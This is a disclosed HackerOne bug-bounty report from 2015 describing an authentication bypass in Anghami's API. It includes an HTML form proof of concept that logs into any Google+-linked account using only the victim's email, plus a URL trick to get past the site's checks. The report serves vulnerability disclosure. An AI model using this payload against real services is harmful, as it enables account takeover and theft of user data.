@@ -1,0 +1,34 @@
+ReportLink:https://hackerone.com/reports/86504
+WeaknessName:Privilege Escalation
+Reporter:https://hackerone.com/ibram
+ReportedTo:Anghami(anghami)
+BountyAmount:100.0
+Severity:
+State:Closed
+DateOfDisclosure:02.10.2015 23:54:35
+
+Summary:
+
+Hello,
+This is **CRITICAL** .. I Can Login To Any Account Linked With Google+ With Email Only And Without  Password!!
+##PoC:
+```html
+<form action="https://api.anghami.com/gateway.php" method="POST">
+  <input type="hidden" name="m" value="gop">
+  <input type="hidden" name="u" value="victim@email.com">  <!-- Victim's Email-->
+  <input type="hidden" name="p" value="">
+  <input type="hidden" name="type" value="authenticate">
+  <input type="hidden" name="lang" value="en">
+  <input type="hidden" name="language" value="en">
+  
+  <input type="submit">
+</form>
+```
+And To Make This PoC Work .. You Have To Follow The Same Bypass in My Previous Report [#86428](https://hackerone.com/reports/86428).
+If Your Page URL is `http://localhost/login.html` Make IT Look Like `http://localhost/login.html?https://play.anghami.com/login`.
+Submit The Form .. And You'll Be In The Victim Account.
+
+Please Let Me Know If You Need a Video To Help You Reproduce This Vulnerability.
+
+Best Regards,
+Ebram Marzouk
